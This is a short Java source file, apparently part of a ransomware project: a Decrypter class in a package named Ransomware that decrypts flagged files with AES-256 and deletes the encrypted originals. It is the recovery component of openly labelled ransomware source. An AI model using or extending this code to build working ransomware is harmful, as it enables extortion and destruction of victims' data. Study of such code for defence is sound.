package Ransomware.Decrypter;

import Ransomware.Crypter;
import Ransomware.AES_256;
import java.io.File;

public class Decrypter extends Crypter {

    public Decrypter(String ext,String key){
        super(ext,key);
    }
    public void processFile(File in){
        if(!in.isDirectory()){
            File out = new File(generatorFilePath.getDecrypted(in));
            AES_256.decrypt(in,out,getKey());
            in.deleteOnExit();
        }
    }
    public boolean isCryptableFile(File file){
        return fileFilter.isEncrypted(file);
    }
}
